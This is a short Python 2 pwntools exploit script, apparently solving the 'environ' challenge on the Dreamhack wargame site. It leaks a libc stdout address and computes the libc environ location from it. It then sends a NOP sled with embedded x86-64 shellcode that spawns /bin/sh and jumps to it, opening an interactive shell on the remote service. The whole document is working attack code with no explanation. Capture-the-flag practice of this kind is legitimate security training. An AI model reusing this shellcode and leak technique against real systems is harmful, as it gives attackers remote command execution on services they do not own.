#!/usr/bin/env python2

from pwn import *
import re

context.update(arch="amd64", os="linux")

HOST = "127.0.0.1"
PORT = 12345
HOST = "host1.dreamhack.games"
PORT = 21652

e = ELF("./environ")

conn = remote(HOST, PORT)

environ_offset = 0x7fffffffe568-0x7fffffffe450
stdout_libc_offset = 0x03C5620
environ_libc_offset = 0x03C6F38

stdout = int(re.search("0[xX][0-9a-fA-F]+", conn.recv()).group(), 16)
environ = (stdout - stdout_libc_offset) + environ_libc_offset

payload = asm("nop") * environ_offset
payload += "\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"

conn.sendlineafter("Size: ", "700")
conn.sendafter("Data: ", payload)
conn.sendlineafter("jmp=", str(environ))
conn.interactive()
